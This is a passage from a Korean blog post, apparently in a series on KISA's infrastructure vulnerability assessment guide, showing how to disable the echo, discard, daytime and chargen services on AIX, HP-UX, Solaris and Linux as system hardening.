<td>1) vi 편집기를 이용하여 <code>echo</code> <code>discard</code> <code>daytime</code> <code>chargen</code> 필드 주석처리<br />    <code># vi /etc/inetd.conf</code><br />    <code>&lt;inetd.conf&gt;</code><br />    <code>#echo    stream    tcp    nowait    root    internal</code><br /><br />2) 필드 주석처리 후 재가동(AIX)<br />    <code># refresh -s inetd</code><br /><br />2) 필드 주석처리 후 재가동(HP-UX)<br />    <code># inetd -c</code></td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td>1) 기타 서비스 데몬 확인<br />    <code># inetadm | grep echo</code><br /><br />2) inetadm -d “중지하고자 하는 데몬” 명령으로 서비스 데몬 중지<br />    <code># inetadm -d svc:/network/echo:stream</code></td>
</tr>
<tr>
<td>LINUX<br />(xinetd일 경우)</td>
<td>1) vi 편집기를 이용하여 <code>/etc/xinetd.d/</code> 디렉터리 내 <code>echo</code> <code>discard</code> <code>daytime</code> <code>chargen</code> 파일 열기<br /><br />2) 아래와 같이 설정 <code>(Disable = yes 설정)</code><br />    <img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-23/vi.png"><br /><br />3) xinetd 서비스 재시작<br />    <code># service xinetd restart</code></td>
</tr>
</tbody></table>
<br>

<br>

<p><code>/etc/xinetd.d/echo-stream</code> 파일에서 <code>disable=yes</code>로 설정해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-23/vi.png">

<br>

<br>

<p><code>echo</code> 포트를 닫았습니다.<br><br></p>
<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-23/grep_2.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
</search>
